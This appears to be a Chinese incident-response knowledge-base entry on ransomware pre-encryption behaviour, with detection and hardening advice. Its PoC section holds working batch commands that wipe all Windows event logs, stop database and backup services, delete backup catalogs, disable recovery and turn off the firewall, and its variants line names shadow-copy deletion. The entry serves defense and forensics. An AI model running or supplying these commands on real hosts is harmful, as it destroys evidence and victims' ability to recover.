---
id: defense-incident-response-ransomware-pre-encryption-cleanup
title: 勒索加密前的反取证与前置脚本行为
type: scenario
domain: defense
path: defense/incident-response
technique: ransomware-pre-encryption-cleanup
aliases:
- 勒索前置脚本
- wevtutil 清日志
- killprocess.cmd
- 加密前破坏恢复
tags:
- ransomware
- windows
- wevtutil
- bcdedit
- wbadmin
- anti-forensics
- incident-response
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-C
  verified_at: '2026-11-04T19:20:29+08:00'
  notes: 已对照原文与9张图核对：LogDelete.bat/Clearr.cmd 的 wevtutil 枚举清空、killprocess.cmd 停 SQL 服务/删备份/禁恢复/关防火墙、入口机最后加密、Amcache 中 5-NS 执行记录均一致；原文未给脚本完整执行顺序与账户上下文，confidence=medium 已注明
---

## 一句话结论

勒索攻击在批量加密前通常会执行一组固定动作：清空事件日志、停止数据库与备份相关服务、删除卷影/备份目录、关闭防火墙、禁用系统恢复；这些动作留下的行为序列比加密本身更早、更适合作为检测与阻断点。

## 原理

勒索加密要成功，必须解决四类阻碍：

- **文件被占用**：数据库、邮件、备份服务持有文件句柄，加密器可能跳过或失败，因此先 `net stop` 相关服务（SQLWriter、MSSQLSERVER、SQLSERVERAGENT 等）。
- **系统可恢复**：Windows 的系统恢复、卷影副本、wbadmin 备份目录能让受害者快速还原，因此用 `bcdedit /set recoveryenabled no`、`wbadmin delete catalog` 等破坏恢复能力。
- **防御与观测**：关闭防火墙可以放开后续横向通信，也减少拦截；清空日志则抹掉入口与横向痕迹。
- **证据与追查**：`wevtutil el` 枚举日志通道、`wevtutil cl` 逐条清空，使本机几乎不留下执行记录；若日志未外发，入口主机的时间线会完全断掉。

攻击者通常以管理员或 SYSTEM 权限运行这些脚本，因此脚本本身不需要漏洞，依赖的是已经取得的最高权限。

## 触发条件

- 攻击者已获得 Windows 主机的本地管理员/SYSTEM 权限；
- 主机未限制 `wevtutil`、`bcdedit`、`wbadmin`、`netsh` 等高权限命令；
- 事件日志仅保存在本地，未实时外发；
- 备份与业务主机处于同一信任域，备份目录可被管理员账户删除；
- 缺少 EDR 行为告警或应用白名单。

## 利用步骤

1. 取得管理员权限并投放工具包（扫描器、密码抓取工具、加密器、脚本）；
2. 执行日志清理脚本，枚举并清空所有事件日志通道；
3. 执行前置脚本：停止数据库/备份服务、删除备份目录与备份编录、禁用系统恢复、关闭防火墙；
4. 使用内网扫描与共享爆破工具横向扩散，逐台加密；
5. 最后加密入口跳板机并离场，销毁进出通道。

## PoC

以下为观察到的脚本行为片段，仅作检测与复盘用途，不应在真实主机执行：

```bat
:: 枚举并清空全部事件日志
FOR /F "delims=" %%I IN ('WEVTUTIL EL') DO (WEVTUTIL CL "%%I")
```

```bat
:: 判断管理员权限后逐通道清空
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
:do_clear
wevtutil.exe cl %1
```

```bat
:: 加密前置：停服务、删备份、关恢复、关防火墙
net stop SQLWriter
net stop MSSQLSERVER
net stop SQLSERVERAGENT
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
netsh advfirewall set currentprofile state off
netsh firewall set opmode mode=disable
```

## 变体与关联

- 变体：`vssadmin delete shadows /all /quiet`、`wmic shadowcopy delete`、`diskshadow` 删除卷影；`wbadmin delete systemstatebackup`；删除 `C:\Windows\System32\config\SYSTEM` 等注册表配置单元；使用第三方工具（如 GMER、PCHunter）对抗 EDR。
- 关联：[[pentest-initial-access-exposed-rdp-nat-guest]]（入口获取）；[[defense-forensics-rdp-source-gateway-snat]]（来源判读）。
- 不确定点：案例未给出脚本执行顺序、账户上下文和完整命令行，置信度定为 medium；不同勒索家族的前置动作集合可能不同。

## 检测与防御

- **高价值检测序列**：短时间内出现“停止 SQL/备份服务 → bcdedit 修改恢复配置 → wbadmin 删除编录 → 防火墙被关闭”，几乎可判定为勒索前置行为，应立即隔离主机。
- **日志完整性**：监控 1102（审核日志被清除）、104（日志被清除）事件；将事件日志实时转发到独立服务器，本机日志被清后仍保留副本。
- **执行痕迹**：即使事件日志被清，仍可从 Amcache/ShimCache、Prefetch、USN Journal、SRUM、EDR 遥测和文件时间戳还原程序执行与加密时间线。
- **权限与策略**：限制普通管理员执行 `bcdedit`、`wbadmin`、`vssadmin`；启用应用白名单；数据库与备份服务使用独立低权限账户。
- **备份与恢复**：核心数据保留离线/不可变备份，备份凭据与生产域隔离；定期演练恢复，避免备份编录被一并删除后无从恢复。
- **网络侧**：限制内网 445/3389 横向访问，部署分段隔离；对短时间内大量 SMB 连接失败与共享枚举告警。
